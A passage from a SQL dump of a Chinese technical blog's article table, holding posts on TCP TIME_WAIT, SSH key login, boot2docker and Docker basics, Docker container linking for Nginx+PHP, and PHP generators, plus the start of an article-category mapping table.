done"告诉客户端，客户端来关闭这个连接。如果客户端由于某些原因关闭连接失败了，然后服务器直接中断连接。\r\n\r\n在客户端，事情就更加复杂一点，毕竟它需要初始发起一个主动关闭去终止TCP连接，如果客户端终止连接，它将以`TIME_WAIT`状态结束。但是，在客户端以`TIME_WAIT`终止连接有很多优点。第一，如果因为某些原因，客户端由于`TIME_WAIT`的问题而造成的连接问题不用影响到其它客户端。第二，如果频繁的打开关闭到同一个服务器的TCP连接的话是非常低效的。不要设计这种客户端每分钟都去连接服务器并且打开一个新的连接的协议。取而代之的是使用持久连接的设计并且只在连接失败的时候重新连接。如果中间的路由器拒绝保持没有数据流的连接的话，你可以实现一个应用级别的ping，使用TCP的`keep alive`或者接受路由器的重置连接；这样的好处是你不会积累很多`TIME_WAIT`的socket。如果你所做的操作的生存周期非常短，可以考虑一些连接池的设计，让连接一直保持打开和可重复使用。最后，如果你必须在客户端频繁的打开和关闭到同一个服务器的连接，可能你需要设计应用级别的关闭方式。你的客户端可以发送一个"I''m done"的消息，然后服务器可以发送一个"goodbye"的响应消息，然后客户端终止连接。\r\n\r\n`TIME_WAIT`的存在是有它的理由的，通过缩短`2MSL`的时间或者使用`SO_REUSEADDR`允许连接重用并不总是好主意。如果你有能力去设计你的协议避免`TIME_WAIT`产生的问题的话，你就可以避免这里所有的问题。\r\n\r\n你过你希望获取更多关于`TIME_WAIT`的实现和如何利用它的信息，参考这两篇文章：\r\n\r\n- [The TIME-WAIT state in TCP and Its Effect on Busy Servers][]\r\n- [2.7 - Please explain the TIME_WAIT state][]\r\n\r\n\r\n-----------\r\n原文: [TIME_WAIT及其对协议和可扩展的客户端服务器系统设计的影响](http://www.serverframework.com/asynchronousevents/2011/01/time-wait-and-its-design-implications-for-protocols-and-scalable-servers.html)\r\n[TCP-StateTransitionDiagram-NormalTransitions]:http://blog.aicode.cc/assets/images/TCP-StateTransitionDiagram-NormalTransitions-thumb-500x749-271.png\r\n[TCP-StateTransitionDiagram-ClosureTransitions]:http://blog.aicode.cc/assets/images/TCP-StateTransitionDiagram-ClosureTransitions-thumb-500x445-274.png\r\n[RFC793]:https://tools.ietf.org/html/rfc793\r\n[TcpTimedWaitDelay]:http://technet.microsoft.com/en-us/library/cc938217.aspx\r\n[TIME_WAIT-why]:http://blog.aicode.cc/assets/images/TIME_WAIT-why-thumb-500x711-277.png\r\n[MaxUserPort]:http://technet.microsoft.com/en-us/library/cc938196.aspx\r\n[SO_EXCLUSIVEADDRUSE]:http://msdn.microsoft.com/en-us/library/ms740621(v=vs.85).aspx\r\n[The TIME-WAIT state in TCP and Its Effect on Busy Servers]:http://www.isi.edu/touch/pubs/infocomm99/infocomm99-web/\r\n[2.7 - Please explain the TIME_WAIT state]:http://developerweb.net/viewtopic.php?id=2941', '在构建基于 TCP 协议的 C/S 系统的时候，经常会因为一些简单的错误而导致严重的影响系统的可扩展性。 其中一些错误是因为对`TIME_WAIT`状态不理解导致的。 ', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/92b1401f4a2db75da21d2b91b82a4a4e.png', 'mylxsw', '翻译', 1, 0, 1427860513, 1434533453, 0, 'markdown'),
(419, 'Linux使用ssh公钥免密码登录', '在Linux(MAC)下，每次登录远程Linux服务器都使用帐号密码是非常麻烦的，使用SSH公钥登录，可以免去输入密码的麻烦。\r\n\r\n首先，使用`ssh-keygen`命令创建自己的公私密钥\r\n\r\n    ssh-keygen\r\n\r\n执行成功后，在`~/.ssh`目录下，会创建名为`id_rsa`的私钥和`id_rsa.pub`的公钥。\r\n\r\n接下来，对需要使用公钥进行管理的服务器，使用`ssh-copy-id`命令将公钥上传到服务器即可。\r\n\r\n    ssh-copy-id <account>@<server address>\r\n\r\n现在，就可以使用命令`ssh <account>@<server address`命令登录服务器而不会提示需要输入密码了。\r\n\r\n> 在Mac上，如果没有这两个命令的话，可以使用`brew`进行安装`brew install ssh`和`brew install ssh-copy-id`。\r\n\r\n\r\n-----------\r\n\r\n参考： [SSH原理与运用（一）：远程登录](http://www.ruanyifeng.com/blog/2011/12/ssh_remote_login.html)', '在Linux(MAC)下，每次登录远程Linux服务器都使用帐号密码是非常麻烦的，使用SSH公钥登录，可以免去输入密码的麻烦。\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/59af99ccbf6e2be11166cbc5210b55f9.png', 'mylxsw', '原创', 1, 0, 1430731510, NULL, NULL, 'markdown'),
(420, '使用boot2docker管理docker', '在Mac上使用Docker，需要使用`boot2docker`建立docker运行的虚拟机宿主环境。安装`boot2docker`可以简单的通过`brew`进行安装。\r\n\r\n	brew install boot2docker\r\n\r\n###启动boot2docker\r\n\r\n成功安装之后，使用以下方式启动docker\r\n\r\n	boot2docker init\r\n\r\n以上命令只需要执行一次即可，它创建了Docker运行所需要的虚拟机环境。以后运行的时候，需要先开启docker虚拟机\r\n\r\n	boot2docker start\r\n\r\n这样就启动了Docker的虚拟机环境，使用命令`boot2docker shellinit`查看Docker客户端的环境变量\r\n\r\n	$ boot2docker shellinit\r\n    Writing /Users/mylxsw/.boot2docker/certs/boot2docker-vm/ca.pem\r\n    Writing /Users/mylxsw/.boot2docker/certs/boot2docker-vm/cert.pem\r\n    Writing /Users/mylxsw/.boot2docker/certs/boot2docker-vm/key.pem\r\n        export DOCKER_HOST=tcp://192.168.59.103:2376\r\n        export DOCKER_CERT_PATH=/Users/mylxsw/.boot2docker/certs/boot2docker-vm\r\n        export DOCKER_TLS_VERIFY=1\r\n\r\n你可以手动的执行输出的后面三条export命令设置环境变量，也可以使用下面的方法自动设置\r\n\r\n	$ eval "$(boot2docker shellinit)"\r\n\r\n到此为止，boot2docker已经运行，并且docker的客户端环境已经建立，要验证是否成功，运行下面的命令\r\n\r\n	$ boot2docker status\r\n    running\r\n    $ docker version\r\n    Client version: 1.3.2\r\n    Client API version: 1.15\r\n    Go version (client): go1.3.3\r\n    Git commit (client): 39fa2fa\r\n    OS/Arch (client): darwin/amd64\r\n    Server version: 1.6.2\r\n    Server API version: 1.18\r\n    Go version (server): go1.4.2\r\n    Git commit (server): 7c8fca2\r\n\r\n使用命令`boot2docker ssh`:\r\n\r\n![boot2docker-ssh][]\r\n\r\n> 如果在执行docker命令的时候出现类似如下错误\r\n> *dial unix /var/run/docker.sock: no such file or directory*\r\n> 是因为没有设置正确的环境变量导致的，执行命令 `eval "$(boot2docker shellinit)"` 重新设置环境变量即可。\r\n\r\n###基本操作\r\n\r\n在`DOCKER_HOST`上启动一个Nginx容器\r\n\r\n	$ docker run -d -P --name web nginx\r\n\r\n上述命令中，`docker run`命令启动一个容器运行，然后退出，`-d`选项指定该容器`docker run`命令执行完成后在后台运行。`-P`选项将容器开放的端口暴露给宿主机，这样我们就可以访问它们了。\r\n\r\n要查看当前运行了哪些容器，使用`docker ps`命令\r\n\r\n![docker-ps][]\r\n\r\n查看容器开放了哪些端口，使用命令`docker port`\r\n\r\n	$ docker port web\r\n    443/tcp -> 0.0.0.0:32769\r\n    80/tcp -> 0.0.0.0:32768\r\n\r\n接下来访问`127.0.0.1:32768`，应该就能看到Nginx的欢迎页面了。\r\n\r\n> 在Mac下，使用boot2docker的时候，访问`127.0.0.1`是不行的，因为docker的宿主机是boot2docker的虚拟机，因此需要使用虚拟机的ip访问`boot2docker ip`获取ip后访问。\r\n>\r\n> ![boot2docker-ip][]\r\n> 访问`192.168.59.103:32768`即可\r\n\r\n要停止或者删除正在运行的容器，使用下列命令\r\n\r\n	$ docker stop web\r\n    $ docker rm web\r\n\r\n要关闭`boot2docker`使用命令`boot2docker stop`。\r\n\r\n###在Container中挂载卷\r\n\r\n当启动`boot2docker`的时候，它会在虚拟机上自动共享Mac上的`/Users`目录，在Docker容器中，可以将该目录中的内容挂载到Docker容器中。\r\n\r\n	docker@boot2docker:~$ ll /Users/\r\n    total 0\r\n    drwxr-xr-x    1 docker   staff          374 Dec  4 08:42 Guest/\r\n    drwxrwxrwx    1 docker   staff          306 Apr 10 16:19 Shared/\r\n    drwxr-xr-x    1 docker   staff         2890 May 19 09:32 mylxsw/\r\n\r\n在Mac的Downloads目录中建立`site/index.hml`文件，如下\r\n\r\n    $ pwd\r\n    /Users/mylxsw/Downloads\r\n    $ tree\r\n    .\r\n    └── site\r\n        └── index.html\r\n\r\n    1 directory, 1 file\r\n    $ cat site/index.html\r\n	my new site: aicode.cc\r\n\r\n启动docker容器\r\n\r\n	$ docker run -d -P -v $HOME/Downloads/site:/usr/share/nginx/html --name mysite nginx\r\n    3ec8c748b423b9ff30efaab6e4c88857c45831cca8a46e97950808635c2dd98d\r\n    $ docker port mysite\r\n    443/tcp -> 0.0.0.0:32770\r\n    80/tcp -> 0.0.0.0:32771\r\n    $ boot2docker ip\r\n    The VM''s Host only interface IP address is: 192.168.59.103\r\n\r\n这里`docker run`的`-v`参数指定了要挂载的卷，也可以使用`--volume`，格式为`-v /host:/container`。\r\n\r\n访问`http://192.168.59.103:32771/`可以看到输出index.html的内容\r\n\r\n	$ curl  http://192.168.59.103:32771/\r\n	my new site: aicode.cc\r\n\r\n\r\n-----\r\n\r\n参考：\r\n\r\n- [Docker官方文档](http://docs.docker.com/installation/mac/)\r\n\r\n[boot2docker-ssh]:http://aicode.qiniudn.com/markdown/boot2docker-ssh.jpg\r\n[docker-ps]:http://aicode.qiniudn.com/markdown/docker-ps.jpg\r\n[boot2docker-ip]:http://aicode.qiniudn.com/markdown/boot2docker-ip.jpg', '在Mac上使用Docker，需要使用`boot2docker`建立docker运行的虚拟机宿主环境。安装`boot2docker`可以简单的通过`brew`进行安装。\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/thumb_small/e823aa5ca32ce4f5f7e6fcf534fa3bb4.jpg', 'mylxsw', '原创', 1, 0, 1432031775, 1432031982, 0, 'markdown'),
(421, 'Docker安装及基本命令', '###安装/启动Docker\r\n\r\n####在CentOS 7上安装\r\n\r\nDocker默认已经包含在CentOS-Extra仓库中，使用以下命令安装\r\n\r\n	sudo yum install docker\r\n\r\n####在CentOS 6.5上安装\r\n\r\n对于CentOS 6.5，Docker是 [EPEL][] 仓库的一部分，因此需要确保已经加入EPEL的YUM源。在CentOS 6上，Docker的包名可能与桌面的docker应用冲突，因此，它的包名改为了`docker-io`。\r\n\r\n	sudo yum -y remove docker\r\n    sudo yum install docker-io\r\n\r\n####启动Docker\r\n\r\n安装Docker之后，需要启动Docker守护进程\r\n\r\n	sudo service docker start\r\n\r\n> 为了让docker能够开机运行，需要使用chkconfig: `sudo chkconfig docker on`\r\n\r\n获取Docker镜像，启动Docker容器\r\n\r\n	sudo docker pull centos\r\n    sudo docker images centos\r\n    sudo docker run -i -t centos /bin/bash\r\n\r\n\r\n###基本命令\r\n\r\n下列命令创建一个容器简单的输出Hello world：\r\n\r\n	$ docker run ubuntu:14.04 /bin/echo ''Hello, world''\r\n    Hello, world\r\n\r\n这里`docker run`命令指定了使用的镜像为`ubuntu:14.04`，我们的容器就是从该镜像运行。当指定一个镜像的时候，Docker首先会在你的宿主机上查找是否存在该镜像，如果不存在的话会从[Docker Hub][]下载。\r\n\r\n接下来指定了要在容器中运行的命令是`/bin/echo ''Hello, world''`，当容器启动之后，Docker会创建一个新的ubuntu 14.04的环境，然后在里面执行这个命令。当命令执行完毕之后，Docker创建的这个容器的生命周期就结束了。\r\n\r\n下面我们创建一个交互式的容器：\r\n\r\n	$ docker run -t -i ubuntu:14.04 /bin/bash\r\n    root@af8bae53bdd3:/#\r\n\r\n这次同样启动了ubuntu 14.04的镜像，但是这里指定了两个额外的参数`-t`和`-i`。参数`-t`为刚才创建的容器分配一个伪终端（pseudo-tty），`-i`则允许我们通过获取容器的标准输入创建一个交互式的连接。\r\n\r\n要退出该容器，在终端输入`exit`或者`ctrl+D`即可，这样该容器就可以停止了\r\n\r\n    root@2e3e7e77adbd:/# exit\r\n    exit\r\n\r\n几个常用的docker命令:\r\n\r\n- `docker ps` 列出Container\r\n- `docker logs` 显示容器的标准输出\r\n- `docker stop` 停止运行中的容器\r\n- `docker version` 显示当前docker客户端和守护进程的版本信息\r\n\r\n`docker`命令的子命令很多，\r\n\r\n    attach    附加到一个运行中的容器上去\r\n    build     从Dockerfile构建镜像\r\n    commit    从容器当前的修改创建一个新的镜像\r\n    cp        从容器的文件系统复制文件/文件夹到主机路径\r\n    create    创建一个新的容器\r\n    diff      检查容器文件系统发生的修改\r\n    events    从服务器获取实时的事件\r\n    exec      在已存在的容器中运行命令\r\n    export    将容器中的内容以流的方式导出为tar归档\r\n    history   显示镜像的历史\r\n    images    列出所有镜像\r\n    import    从tar包中的内容创建一个新的文件系统镜像\r\n    info      显示系统的信息\r\n    inspect   返回容器低级的信息\r\n    kill      杀掉一个运行中的容器\r\n    load      从tar归档载入镜像\r\n    login     注册或者登录到Docker注册服务器\r\n    logout    从Docker注册服务器登出\r\n    logs      检索容器中的日志\r\n    port      查询基于NAT到PRIVATE_PORT的公开端口\r\n    pause     暂停容器中所有的进程\r\n    ps        列出容器\r\n    pull      从Docker注册服务器拉取一个镜像或者仓库\r\n    push      推送一个镜像或者仓库到Docker注册服务器\r\n    restart   重启一个运行中的容器\r\n    rm        删除一个/多个容器\r\n    rmi       删除一个/多个镜像\r\n    run       在新的容器中运行命令\r\n    save      保存镜像到tar归档\r\n    search    从Docker Hub搜索一个镜像\r\n    start     启动一个已经停止的容器\r\n    stop      停止运行中的容器\r\n    tag       为仓库中的镜像添加标签\r\n    top       查询容器中运行的进程\r\n    unpause   取消容器的暂停状态\r\n    version   显示Docker的版本信息\r\n    wait      堵塞住直到容器停止，然后打印它的退出码\r\n\r\n\r\n使用Dockerfile构建镜像：\r\n\r\n	docker build -t <your username>/<image name> .\r\n\r\n运行镜像：\r\n\r\n	docker run -p <本地端口>:<容器端口> -d <镜像名称>\r\n	curl -i <本地IP>:<本地端口>\r\n\r\n查看容器的日志(类似于`tail -f`命令)\r\n\r\n	docker logs -f <容器名称>\r\n\r\n\r\n####例子：使用官方Nginx Docker镜像\r\n\r\n使用之前，需要先获取官方nginx镜像\r\n\r\n    docker pull nginx\r\n\r\n执行命令如下\r\n\r\n	docker run --name nginx_server -d -p 8080:80 -v /Users/mylxsw/codes/php:/usr/share/nginx/html:ro nginx\r\n\r\n下面对提供的参数进行一一解释:\r\n\r\n- `--name`指定了我们创建的容器名称为nginx_server\r\n- `-d`指定了容器在后台运行\r\n- `-p`则指定了将容器的`80`端口映射到宿主机的`8080`端口\r\n- `-v`参数指定了将本地的`/Users/mylxsw/codes/php`目录映射到容器的`/usr/share/nginx/html`目录，并且访问权限为只读\r\n\r\n启动该容器之后，就可以通过`http://localhost:8080`访问了。\r\n\r\n更复杂一点，可以通过使用`-v`参数指定nginx配置文件`-v /some/nginx.conf:/etc/nginx/nginx.conf:ro`。\r\n\r\n> 在指定新的nginx配置文件时，注意一定要设置nginx的`daemon off;`配置项，如果以后台模式运行的话，容器就没法跟踪nginx的进程，容器启动后就会立即结束。\r\n\r\n\r\n如果仅仅是测试的话，可以使用`--rm`选项，这样，在容器结束运行之后就可以自动删除，当然使用`--rm`选项的时候不能和`-d`选项同时使用。\r\n\r\n    docker run --rm --name nginx_server -d -p 8080:80 -v /Users/mylxsw/codes/php:/usr/share/nginx/html:ro nginx\r\n\r\n\r\n\r\n-----\r\n\r\n参考：\r\n\r\n[Dockerizing Applications: A "Hello world"](http://docs.docker.com/userguide/dockerizing/)\r\n\r\n\r\n[EPEL]:https://fedoraproject.org/wiki/EPEL\r\n[Docker Hub]:https://hub.docker.com/\r\n', 'Docker默认已经包含在CentOS-Extra仓库中，使用以下命令安装\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/e823aa5ca32ce4f5f7e6fcf534fa3bb4.jpg', 'mylxsw', '原创', 1, 0, 1433066853, NULL, NULL, 'markdown'),
(422, 'Docker多容器连接-以Nginx+PHP为例', 'Docker提供了多个容器直接访问的方法，最简单的方式是直接使用端口映射`-p`参数指定映射的端口或者`-P`映射所有端口，多个容器直接通过网络端口进行访问。\r\n\r\n但网络端口映射方式并不是Docker中连接多个容器的唯一方式，还可以使用Docker的连接系统(`--link`)连接多个容器，当容器连接到一起时，接受者容器就可以看到源容器的信息。\r\n\r\n##建立容器之间的连接 - 以Nginx+PHP为例\r\n\r\n在容器直接建立连接要使用`--link`选项\r\n\r\n	--link <name or id>:alias\r\n\r\n这里我们通过建立一个 [nginx/php-fpm][] 的服务，示例一下如何在两个或者多个容器之间建立连接。\r\n\r\n要建立容器连接的话，就要依赖容器的名字了，使用`--name`指定源容器的名字为`phpfpm`\r\n\r\n	docker run --name phpfpm -d -v /Users/mylxsw/codes/php:/app php:5.6-fpm\r\n\r\n接下来创建nginx容器，并且连接到phpfpm容器上去\r\n\r\n	docker run --name nginx_server -d -p 80:80 --link phpfpm:phpfpm -v /Users/mylxsw/Dockers/php/nginx.conf:/etc/nginx/nginx.conf --volumes-from phpfpm  nginx\r\n\r\n这里通过`--link`选项指定了要连接的容器是phpfpm，并且使用`--volumes-from phpfpm`将phpfpm容器挂载的卷也挂载到了nginx容器上，另外，这里使用自定义的nginx配置文件（nginx.conf）覆盖了原先的配置，新的 [nginx.conf][] 内容如下：\r\n\r\n	...\r\n    root   /app; # 这里设置了项目挂载的容器的根目录\r\n\r\n    location ~ \\.php$ {\r\n        fastcgi_pass   phpfpm:9000;# phpfpm访问地址\r\n	...\r\n\r\n需要注意的是，在该配置文件中设置了服务器的根目录(root)为`/app`目录，也就是我们挂载的目录，另外是phpfpm的配置，我们将`fastcgi_pass`的值从`127.0.0.1:9000`改为了`phpfpm:9000`，这里的`phpfpm`是域名，在nginx容器的`/etc/hosts`文件中自动配置为phpfpm容器的访问IP。\r\n\r\n##容器互通信息\r\n\r\n建立两个容器之间的连接之后，在接收容器（Recipient）中必然会需要访问源容器（Source）的资源，我们在为容器建立连接时，源容器在创建时并没有使用`-p/-P`指定要暴露出来的端口，因此如何访问源容器的信息呢？\r\n\r\n为了可以让接收容器能够访问源容器的信息，Docker提供了两种方式：\r\n\r\n- 环境变量\r\n- /etc/hosts文件\r\n\r\n###环境变量\r\n\r\nDocker在连接容器的时候，会根据`--link`提供的参数自动的在接收者容器中创建一些环境变量，包括源容器的`Dockerfile`中使用`ENV`命令设置的环境变量和源容器启动时(`docker run`)，使用`-e`或者`--env`， `--env-file`参数指定的环境变量。\r\n\r\n主要包含以下环境变量，这里假设alias=**webdb**。\r\n\r\n    <alias>_NAME\r\n    <name>_PORT_<port>_<protocol>\r\n    <prefix>_ADDR\r\n    <prefix>_PORT\r\n    <prefix>_PROTO\r\n\r\n例如:\r\n\r\n    $ docker run  -i -t --rm --link phpfpm:php php:5.6-fpm env\r\n    PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin\r\n    HOSTNAME=e5973c0d639f\r\n    TERM=xterm\r\n    PHP_PORT=tcp://172.17.0.74:9000\r\n    PHP_PORT_9000_TCP=tcp://172.17.0.74:9000\r\n    PHP_PORT_9000_TCP_ADDR=172.17.0.74\r\n    PHP_PORT_9000_TCP_PORT=9000\r\n    PHP_PORT_9000_TCP_PROTO=tcp\r\n    PHP_NAME=/tender_banach/php\r\n    PHP_ENV_PHP_INI_DIR=/usr/local/etc/php\r\n    PHP_ENV_GPG_KEYS=6E4F6AB321FDC07F2C332E3AC2BF0BC433CFC8B3 0BD78B5F97500D450838F95DFE857D9A90D90EC1\r\n    PHP_ENV_PHP_VERSION=5.6.9\r\n    PHP_INI_DIR=/usr/local/etc/php\r\n    PHP_EXTRA_CONFIGURE_ARGS=--enable-fpm --with-fpm-user=www-data --with-fpm-group=www-data\r\n    GPG_KEYS=6E4F6AB321FDC07F2C332E3AC2BF0BC433CFC8B3 0BD78B5F97500D450838F95DFE857D9A90D90EC1\r\n    PHP_VERSION=5.6.9\r\n    HOME=/root\r\n\r\n上述例子中，指定了容器的别名为`php`，因此所有环境变量都是以`PHP_`开头。\r\n\r\n> 注意的是，如果源容器重启，接收容器中的环境变量信息并不会自动更新，因此，如果要使用源容器的IP地址，请使用/etc/hosts中配置的主机信息。\r\n\r\n###/etc/hosts文件\r\n\r\n除了环境变量之外，Docker也在接收容器的`/etc/hosts`文件中更新了hosts信息。\r\n\r\n    $ docker run  -i -t --rm --link phpfpm:php php:5.6-fpm /bin/bash\r\n    root@4678acd72dca:/var/www/html#\r\n    root@4678acd72dca:/var/www/html# cat /etc/hosts\r\n    172.17.0.77	4678acd72dca\r\n    ...\r\n    172.17.0.74	php f81b2615a6a8 phpfpm\r\n\r\n从上可以看出，在接收容器的hosts文件中增加了两条额外的信息，本机IP和别名以及源容器的IP和别名(php)。\r\n\r\n与环境变量不同的是，如果源容器重启了，接收容器中`/etc/hosts`中的信息会自动更新。\r\n\r\n----\r\n\r\n参考:\r\n\r\n[Linking Containers Together](https://docs.docker.com/userguide/dockerlinks/)\r\n\r\n[How can I use environment variables in Nginx.conf](http://serverfault.com/questions/577370/how-can-i-use-environment-variables-in-nginx-conf)\r\n\r\n\r\n\r\n[nginx.conf]:https://github.com/mylxsw/DockerDemo/blob/master/nginx-php/nginx.conf\r\n[nginx/php-fpm]:https://github.com/mylxsw/DockerDemo/tree/master/nginx-php', 'Docker提供了多个容器直接访问的方法，最简单的方式是直接使用端口映射`-p`参数指定映射的端口或者`-P`映射所有端口，多个容器直接通过网络端口进行访问。\r\n', 'http://agiledev-arsenals.stor.sinaapp.com/cover/e823aa5ca32ce4f5f7e6fcf534fa3bb4.jpg', 'mylxsw', '原创', 1, 0, 1433066948, 1433067260, 0, 'markdown');
INSERT INTO `ar_article` (`id`, `title`, `content`, `intro`, `feature_img`, `author`, `source`, `isvalid`, `creator`, `publish_date`, `update_date`, `updator`, `model`) VALUES
(423, 'Php5.5新特性 Generators详解', '在**PHP5.5.0**版本中，新增了生成器*(Generators)*特性，用于简化实现迭代器接口*(Iterator)*创建简单的迭代器的复杂性。\r\n\r\n通过生成器，我们可以轻松的使用`foreach`迭代一系列的数据，而不需要事先在内存中构建要被迭代的对象，大大减少了内存开销。\r\n\r\n当生成器函数被调用的时候，它会返回一个可迭代的对象，当对该对象进行迭代的时候，PHP将会在需要的时候调用生成器函数，并且在生成器使用新增的关键字`yield`产生一个新的值的时候，保存迭代器内部的状态。迭代器没有新的值需要产生的时候，生成器函数就可以直接退出，外部函数继续执行。\r\n\r\n> 注意，在生成器函数中，不能使用`return`语句返回值，使用`return`返回值的话会产生编译器错误。但是，使用空的`return`是可以的，它会使迭代器终止。\r\n\r\n生成器函数与普通函数一样的，唯一的区别函数内使用了`yield`关键字。`yield`语句可以说是生成器函数的核心，简单来说，`yield`就像`return`语句一样，区别是`return`语句返回后函数就结束了，而使用`yield`返回后，只是暂停了函数的执行，转到外部函数继续执行，下次调用生成器函数的时候，继续执行生成器函数内部的代码。\r\n\r\n####一个简单的例子 - 生成器版本的range函数\r\n\r\n一个简单的例子是使用`foreach`迭代函数`range`的返回值，如果调用的是`range(0, 1000000)`的话，将会消耗超过100M的内存。而使用生成器的话，可能只需要消耗1KB内存都不到。\r\n\r\n	<?php\r\n    function xrange($start, $end) {\r\n    	if ($start > $end) {\r\n        	throw new RuntimeException("起始值不能大于截止值");\r\n        }\r\n        for ($i = $start; $i <= $end; $i += 1) {\r\n        	// 使用yield关键字，每次到这里函数都会返回$i的值，并且控制权交给外部函数继续执行\r\n            yield $i;\r\n        }\r\n    }\r\n\r\n    foreach (xrange(1, 9) as $number) {\r\n        echo "$number ";\r\n    }\r\n\r\n上面的例子输出如下：\r\n\r\n![generator-output][]\r\n\r\n上述例子中，我们创建了一个名为`xrange`的函数，函数中使用`yield`不断产生返回值，而调用`xrange(1, 9)`将会创建一个生成器对象。我们可以修改`foreach`这一行打印出`xrange`对象看看\r\n\r\n	...\r\n    $xrange_res = xrange(1, 9);\r\n    var_dump($xrange_res);\r\n    foreach( $xrange_res as $number){\r\n    ...\r\n\r\n输出\r\n\r\n![generator-vardump][]\r\n\r\n可以看出，执行`xrange(1, 9)`的时候确实是返回了一个`Generator`对象。\r\n\r\n####使用Generator对象的send方法\r\n\r\n在上面的例子中，我们使用`yield`语句的时候都是作为单独的一行语句执行的，也就是`yield`语句产生结果给外部，那么在迭代过程中有没有办法从生成器函数外部获取值呢？\r\n\r\n办法总是有的，因为调用生成器函数后返回的是一个`Generator`对象，因此我们可以通过调用该对象的`send`方法从外部给生成器函数传递一个值，在调用`send`方法之后，`yield`会收到`send`函数发送的值。\r\n\r\n    <?php\r\n    function gen() {\r\n        $ret = (yield ''yield1'');\r\n        var_dump("-->" . $ret);\r\n\r\n        $ret = (yield ''yield2'');\r\n        var_dump("-->" . $ret);\r\n    }\r\n\r\n    $gen = gen();\r\n\r\n    var_dump($gen->current());\r\n    var_dump($gen->send(''ret1''));\r\n    var_dump($gen->send(''ret2''));\r\n\r\n输出：\r\n\r\n![generator-gen][]\r\n\r\n这里我们首先创建了名为`gen`的生成器对象，然后打印`$gen->current()`方法的返回值，该返回值就是迭代器第一次迭代时产生的当前值，因此输出了`yield1`。\r\n\r\n接下来我们调用了`$gen->send(''ret'')`方法，这时，生成器内第一个`yield`语句返回该方法传递的值`ret1`，因此输出了`$ret`的值为`ret1`。\r\n\r\n接着由于生成器内部执行到了第三条语句`$ret = (yield ''yield2'')`，因此外部的第二个`var_dump`输出了`yield2`。最后调用`$gen->send(''ret2'')`与第一次类似，不过这次生成器内部调用`yield`之后已经没有`yield`了，因此返回的是`NULL`。\r\n\r\n> 注意，这里的`$ret = (yield ''yield2'')`语句中，使用括号包含了`yield ''yield2''`语句，这里是必须的，如果在表达式上下文中使用`yield`，必须将`yield`放在括号内，否则会报错。\r\n\r\n####返回关联数组\r\n\r\n前面的例子中，我们使用`yield`关键字返回的总是单个值，实际上PHP也对返回关联数组提供了支持，基本语法:\r\n\r\n	yield key => val\r\n\r\n使用该语法格式可以在foreach的时候，返回与遍历管理数组相同的结果。\r\n\r\n	<?php\r\n    function gen2() {\r\n        $array = [\r\n            ''username'' => ''mylxsw'',\r\n            ''site''     => ''http://aicode.cc''\r\n        ];\r\n\r\n        foreach ($array as $key => $val) {\r\n            yield $key => $val;\r\n        }\r\n    }\r\n\r\n    foreach(gen2() as $key => $val) {\r\n        var_dump($key . ''   :   '' . $val);\r\n    }\r\n\r\n输出:\r\n\r\n![gen2-output][]\r\n\r\n####使用引用\r\n\r\n我们还可以让生成器以引用的方式返回数据，这样就可以在生成器外部直接修改生成器内部数据的值。\r\n\r\n    <?php\r\n    function &gen_reference() {\r\n        $value = 3;\r\n\r\n        while ($value > 0) {\r\n            yield $value;\r\n        }\r\n    }\r\n\r\n    foreach (gen_reference() as &$number) {\r\n        echo (--$number).''... '';\r\n    }\r\n\r\n上述例子中，需要注意的是，生成器函数的定义和遍历的时候使用了`&$number`。\r\n\r\n最后，生成器与自定义的迭代器对象是不完全相同的，生成器一旦开始迭代，就不能再`rewind`了，只能一直向前迭代，直到迭代完成。如果希望多次迭代一个生成器对象的话，可以多次调用生成器函数创建新的生成器对象或者是使用[clone][]关键字。\r\n\r\n-----\r\n\r\n参考:\r\n\r\n- [Cooperative multitasking using coroutines (in PHP!)](http://nikic.github.io/2012/12/22/Cooperative-multitasking-using-coroutines-in-PHP.html)\r\n- [Generators](http://php.net/manual/en/language.generators.php)\r\n\r\n[clone]:http://php.net/manual/en/language.oop5.cloning.php\r\n[generator-output]:http://source.aicode.cc/markdown/generator-output.jpg\r\n[generator-vardump]:http://source.aicode.cc/markdown/generator-vardump.jpg\r\n[generator-gen]:http://source.aicode.cc/markdown/generator-gen.jpg\r\n[gen2-output]:http://source.aicode.cc/markdown/gen2-output.jpg', '在PHP5.5.0版本中，新增了生成器(Generators)特性，用于简化实现迭代器接口(Iterator)创建简单的迭代器的复杂性。', 'http://agiledev-arsenals.stor.sinaapp.com/cover/aa29571ccac80268a197bce2b1ffbd34.jpg', 'mylxsw', '原创', 1, 0, 1433411002, NULL, NULL, 'markdown');

-- --------------------------------------------------------

--
-- 表的结构 `ar_article_category`
--

CREATE TABLE IF NOT EXISTS `ar_article_category` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `article_id` int(11) NOT NULL COMMENT '文章id',
  `category_id` int(11) NOT NULL COMMENT '分类ID',
  `sort` smallint(6) DEFAULT NULL COMMENT '显示顺序\n',
  `is_main` smallint(6) DEFAULT NULL COMMENT '是否是主类别',
  PRIMARY KEY (`id`,`article_id`,`category_id`),
  KEY `fk_ar_article_category_ar_article_idx` (`article_id`),
  KEY `fk_ar_article_category_ar_category1_idx` (`category_id`)
) ENGINE=MyISAM  DEFAULT CHARSET=utf8 COMMENT='文章-分类关联\n' AUTO_INCREMENT=786 ;

--
-- 转存表中的数据 `ar_article_category`
--

INSERT INTO `ar_article_category` (`id`, `article_id`, `category_id`, `sort`, `is_main`) VALUES
(495, 318, 20, 0, 0),
(541, 323, 20, 0, 0),
(524, 316, 22, 0, 0),
(540, 323, 22, 0, 0),
(622, 319, 24, 0, 0),
(513, 326, 25, 0, 0),
(539, 325, 22, 0, 0),
(538, 327, 20, 0, 0),
(527, 328, 25, 0, 0),
(526, 328, 20, 0, 0),
(537, 329, 20, 0, 0),
(525, 333, 20, 0, 0),
(528, 334, 23, 0, 0),
(542, 335, 20, 0, 0),
(530, 336, 21, 0, 0),
(552, 337, 23, 0, 0),
(630, 338, 19, 0, 0),
(632, 339, 19, 0, 0),
(544, 340, 25, 0, 0),
(710, 341, 21, 0, 0),
(708, 342, 21, 0, 0),
(706, 343, 21, 0, 0),
(555, 344, 18, 0, 0),
(566, 345, 21, 0, 0),
(558, 346, 26, 0, 0),
(560, 347, 18, 0, 0),
(565, 348, 18, 0, 0),
(569, 349, 18, 0, 0),
